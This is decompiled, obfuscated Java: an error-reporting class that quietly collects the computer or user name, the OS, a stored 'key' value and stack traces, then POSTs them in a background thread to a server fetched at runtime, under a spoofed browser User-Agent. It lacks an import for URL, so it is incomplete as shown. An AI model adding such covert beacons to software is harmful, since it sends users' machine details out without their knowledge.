package aurora;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;

public final class pillar {
   private static final int stumble = 6;
   private static final AtomicInteger marina = new AtomicInteger();
   private static final Set<String> dune = java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap());
   private static volatile String goblet;

   private pillar() {
   }

   public static void sherbet(String var0, Throwable var1) {

      pagoda(
         var0,
         "error",
         var1 == null
            ? "unknown"
            : String.valueOf(var1.getMessage()),
         var1
      );
   }

   public static void mobile(String var0, String var1, Throwable var2) {

      pagoda(var0, "fatal", var1, var2);
   }

   public static void pagoda(String var0, String var1, String var2, Throwable var3) {

      try {
         if (marina.get()
            >= 6) {
            return;
         }

         String var8 = var2;
         String var7 = var0;
         if (!dune.add(new StringBuilder().append(var7).append("|").append(var8).toString())) {
            return;
         }

         if (marina.incrementAndGet()
            > 6) {
            return;
         }

         StringBuilder var4 = new StringBuilder();
         if (var3 != null) {
            var4.append(var3.getClass().getName()).append(": ").append(var3.getMessage()).append('\n');
            StackTraceElement[] var5 = var3.getStackTrace();

            for (int var6 = 0; var6 < var5.length && var6 < 10; var6++) {
               var4.append("  at ").append(var5[var6]).append('\n');
            }
         }

         String var10000 = pattern(var1);
         String var10001 = pattern(var0);
         String var10002 = pattern(rattle.laptop);
         String var10003 = pattern(niece());
         String var10004 = pattern(niece());
         String var10005 = pattern(
            System.getProperty("os.name")
         );
         String var10006 = pattern(var2);
         String var16 = pattern(
            var4.toString()
         );
         String var15 = var10006;
         String var14 = var10005;
         String var13 = var10004;
         String var12 = var10003;
         String var11 = var10002;
         String var10 = var10001;
         String var9 = var10000;
         String var18 = new StringBuilder().append("{\"src\":\"pussyback\",\"level\":").append(var9).append(",\"where\":").append(var10).append(",\"key\":").append(var11).append(",\"v\":").append(var12).append(",\"pc\":").append(var13).append(",\"os\":").append(var14).append(",\"msg\":").append(var15).append(",\"stack\":").append(var16).append("}").toString();
         Thread var19 = new Thread(() -> {

               quince(var18);
            }, "err-report");
         var19.setDaemon(true);
         var19.start();
      } catch (Throwable var17) {
      }
   }

   private static String carbon() {

      String var0 = goblet;
      if (var0 != null) {
         return var0;
      }

      try {
         return goblet = rattle.samba();
      } catch (Throwable var2) {
         return null;
      }
   }

   private static String niece() {

      try {
         String var0 = System.getenv("COMPUTERNAME");
         if (var0 != null && !var0.isEmpty()) {
            return var0;
         }
      } catch (Throwable var1) {
      }

      return System.getProperty("user.name", "pc");
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void quince(String var0) {

      String var1 = carbon();
      if (var1 != null) {
         HttpURLConnection var2 = null;
         boolean var12 = false /* VF: Semaphore variable */;

         label110: {
            try {
               var12 = true;
               String var7 = var1;
               var2 = (HttpURLConnection)new URL(new StringBuilder().append(var7).append("/error").toString()).openConnection();
               var2.setRequestMethod("POST");
               var2.setDoOutput(true);
               var2.setConnectTimeout(6000);
               var2.setReadTimeout(6000);
               var2.setRequestProperty("Content-Type", "application/json");
               var2.setRequestProperty("User-Agent", "Mozilla/5.0");
               OutputStream var3 = var2.getOutputStream();

               try {
                  var3.write(var0.getBytes(java.nio.charset.StandardCharsets.UTF_8));
               } catch (Throwable var14) {
                  if (var3 != null) {
                     try {
                        var3.close();
                     } catch (Throwable var13) {
                        var14.addSuppressed(var13);
                     }
                  }

                  throw var14;
               }

               if (var3 != null) {
                  var3.close();
               }

               var2.getResponseCode();
               var12 = false;
               break label110;
            } catch (Throwable var15) {
               var12 = false;
            } finally {
               if (var12) {
                  if (var2 != null) {
                     var2.disconnect();
                  }
               }
            }

            if (var2 != null) {
               var2.disconnect();
            }

            return;
         }

         if (var2 != null) {
            var2.disconnect();
         }
      }
   }

   private static String pattern(String var0) {

      if (var0 == null) {
         return "\"\"";
      }

      StringBuilder var1 = new StringBuilder("\"");

      for (int var2 = 0; var2 < var0.length(); var2++) {
         char var3 = var0.charAt(var2);
         switch (var3) {
            case '\t':
               var1.append("\\t");
               break;
            case '\n':
               var1.append("\\n");
               break;
            case '\r':
               var1.append("\\r");
               break;
            case '"':
               var1.append("\\\"");
               break;
            case '\\':
               var1.append("\\\\");
               break;
            default:
               if (var3 < ' ') {
                  var1.append(String.format("\\u%04x", new Object[]{
                           Integer.valueOf(var3)
                        }));
               } else {
                  var1.append(var3);
               }
         }
      }

      return var1.append('"').toString();
   }
}
